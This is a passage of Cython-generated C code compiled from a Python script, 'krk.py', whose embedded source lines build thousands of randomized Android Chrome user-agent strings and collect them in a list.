    PyList_SET_ITEM(__pyx_t_3, 5, __pyx_kp_s_11);
    __Pyx_INCREF(__pyx_kp_s_12);
    __Pyx_GIVEREF(__pyx_kp_s_12);
    PyList_SET_ITEM(__pyx_t_3, 6, __pyx_kp_s_12);
    __Pyx_INCREF(__pyx_kp_s_13);
    __Pyx_GIVEREF(__pyx_kp_s_13);
    PyList_SET_ITEM(__pyx_t_3, 7, __pyx_kp_s_13);
    __pyx_t_7 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_8 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_t_3};
      __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_8, 1+__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 22, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_b, __pyx_t_6) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":23
 *         aa='Mozilla/5.0 (Linux; U; Android'
 *         b=random.choice(['6','7','8','9','10','11','12','13'])
 *         c=f' TL-tl; {str(gt)}'             # <<<<<<<<<<<<<<
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 *         h=random.randrange(73,100)
 */
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_gt); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyUnicode_Concat(__pyx_kp_u_TL_tl, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_c, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":24
 *         b=random.choice(['6','7','8','9','10','11','12','13'])
 *         c=f' TL-tl; {str(gt)}'
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'             # <<<<<<<<<<<<<<
 *         h=random.randrange(73,100)
 *         i='0'
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_g, __pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge) < 0) __PYX_ERR(0, 24, __pyx_L1_error)

    /* "krk.py":25
 *         c=f' TL-tl; {str(gt)}'
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 *         h=random.randrange(73,100)             # <<<<<<<<<<<<<<
 *         i='0'
 *         j=random.randrange(4200,4900)
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__88, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_h, __pyx_t_2) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":26
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 *         h=random.randrange(73,100)
 *         i='0'             # <<<<<<<<<<<<<<
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_kp_s_0) < 0) __PYX_ERR(0, 26, __pyx_L1_error)

    /* "krk.py":27
 *         h=random.randrange(73,100)
 *         i='0'
 *         j=random.randrange(4200,4900)             # <<<<<<<<<<<<<<
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/537.36'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__89, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_j, __pyx_t_2) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":28
 *         i='0'
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)             # <<<<<<<<<<<<<<
 *         l='Mobile Safari/537.36'
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__90, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_k, __pyx_t_2) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":29
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/537.36'             # <<<<<<<<<<<<<<
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 *         ugen.append(uaku2)
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_l, __pyx_kp_s_Mobile_Safari_537_36) < 0) __PYX_ERR(0, 29, __pyx_L1_error)

    /* "krk.py":30
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/537.36'
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'             # <<<<<<<<<<<<<<
 *         ugen.append(uaku2)
 * for agent in range(10000):
 */
    __pyx_t_2 = PyTuple_New(16); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_11 = 0;
    __pyx_t_12 = 127;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_aa); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__22);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__22);
    PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u__22);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_b); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__91);
    __pyx_t_11 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__91);
    PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_kp_u__91);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_c); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__92);
    __pyx_t_11 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__92);
    PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_kp_u__92);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_g); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_h); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_i); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 9, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 10, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_j); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 11, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 12, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_k); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 13, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__22);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__22);
    PyTuple_SET_ITEM(__pyx_t_2, 14, __pyx_kp_u__22);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_l); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 15, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_2, 16, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_uaku2, __pyx_t_3) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "krk.py":31
 *         l='Mobile Safari/537.36'
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 *         ugen.append(uaku2)             # <<<<<<<<<<<<<<
 * for agent in range(10000):
 *         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ugen); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_uaku2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_t_2); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }

  /* "krk.py":32
 *         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
 *         ugen.append(uaku2)
 * for agent in range(10000):             # <<<<<<<<<<<<<<
 *         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 *         b=random.choice(['6','7','8','9','10','11','12'])
 */
  for (__pyx_t_10 = 0; __pyx_t_10 < 0x2710; __pyx_t_10+=1) {
    __pyx_t_2 = __Pyx_PyInt_From_long(__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_agent, __pyx_t_2) < 0) __PYX_ERR(0, 32, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":33
 *         ugen.append(uaku2)
 * for agent in range(10000):
 *         aa='Mozilla/5.0 (Linux; Android 6.0.1;'             # <<<<<<<<<<<<<<
 *         b=random.choice(['6','7','8','9','10','11','12'])
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_aa, __pyx_kp_s_Mozilla_5_0_Linux_Android_6_0_1) < 0) __PYX_ERR(0, 33, __pyx_L1_error)

    /* "krk.py":34
 * for agent in range(10000):
 *         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 *         b=random.choice(['6','7','8','9','10','11','12'])             # <<<<<<<<<<<<<<
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyList_New(7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_kp_s_6);
    __Pyx_GIVEREF(__pyx_kp_s_6);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_6);
    __Pyx_INCREF(__pyx_kp_s_7);
    __Pyx_GIVEREF(__pyx_kp_s_7);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_7);
    __Pyx_INCREF(__pyx_kp_s_8);
    __Pyx_GIVEREF(__pyx_kp_s_8);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_s_8);
    __Pyx_INCREF(__pyx_kp_s_9);
    __Pyx_GIVEREF(__pyx_kp_s_9);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_s_9);
    __Pyx_INCREF(__pyx_kp_s_10);
    __Pyx_GIVEREF(__pyx_kp_s_10);
    PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_s_10);
    __Pyx_INCREF(__pyx_kp_s_11);
    __Pyx_GIVEREF(__pyx_kp_s_11);
    PyList_SET_ITEM(__pyx_t_3, 5, __pyx_kp_s_11);
    __Pyx_INCREF(__pyx_kp_s_12);
    __Pyx_GIVEREF(__pyx_kp_s_12);
    PyList_SET_ITEM(__pyx_t_3, 6, __pyx_kp_s_12);
    __pyx_t_7 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
        __pyx_t_8 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_t_3};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_8, 1+__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_b, __pyx_t_2) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":35
 *         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
 *         b=random.choice(['6','7','8','9','10','11','12'])
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'             # <<<<<<<<<<<<<<
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         e=random.randrange(1, 999)
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_c, __pyx_kp_s_en_us_10_T_Mobile_myTouch_3G_Sli) < 0) __PYX_ERR(0, 35, __pyx_L1_error)

    /* "krk.py":36
 *         b=random.choice(['6','7','8','9','10','11','12'])
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])             # <<<<<<<<<<<<<<
 *         e=random.randrange(1, 999)
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 */
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 36, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = PyList_New(26); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 36, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_INCREF(__pyx_n_s_A);
    __Pyx_GIVEREF(__pyx_n_s_A);
    PyList_SET_ITEM(__pyx_t_6, 0, __pyx_n_s_A);
    __Pyx_INCREF(__pyx_n_s_B);
    __Pyx_GIVEREF(__pyx_n_s_B);
    PyList_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_B);
    __Pyx_INCREF(__pyx_n_s_C);
    __Pyx_GIVEREF(__pyx_n_s_C);
    PyList_SET_ITEM(__pyx_t_6, 2, __pyx_n_s_C);
    __Pyx_INCREF(__pyx_n_s_D);
    __Pyx_GIVEREF(__pyx_n_s_D);
    PyList_SET_ITEM(__pyx_t_6, 3, __pyx_n_s_D);
    __Pyx_INCREF(__pyx_n_s_E);
    __Pyx_GIVEREF(__pyx_n_s_E);
    PyList_SET_ITEM(__pyx_t_6, 4, __pyx_n_s_E);
    __Pyx_INCREF(__pyx_n_s_F);
    __Pyx_GIVEREF(__pyx_n_s_F);
    PyList_SET_ITEM(__pyx_t_6, 5, __pyx_n_s_F);
    __Pyx_INCREF(__pyx_n_s_G);
    __Pyx_GIVEREF(__pyx_n_s_G);
    PyList_SET_ITEM(__pyx_t_6, 6, __pyx_n_s_G);
    __Pyx_INCREF(__pyx_n_s_H);
    __Pyx_GIVEREF(__pyx_n_s_H);
    PyList_SET_ITEM(__pyx_t_6, 7, __pyx_n_s_H);
    __Pyx_INCREF(__pyx_n_s_I);
    __Pyx_GIVEREF(__pyx_n_s_I);
    PyList_SET_ITEM(__pyx_t_6, 8, __pyx_n_s_I);
    __Pyx_INCREF(__pyx_n_s_J);
    __Pyx_GIVEREF(__pyx_n_s_J);
    PyList_SET_ITEM(__pyx_t_6, 9, __pyx_n_s_J);
    __Pyx_INCREF(__pyx_n_s_K);
    __Pyx_GIVEREF(__pyx_n_s_K);
    PyList_SET_ITEM(__pyx_t_6, 10, __pyx_n_s_K);
    __Pyx_INCREF(__pyx_n_s_L);
    __Pyx_GIVEREF(__pyx_n_s_L);
    PyList_SET_ITEM(__pyx_t_6, 11, __pyx_n_s_L);
    __Pyx_INCREF(__pyx_n_s_M);
    __Pyx_GIVEREF(__pyx_n_s_M);
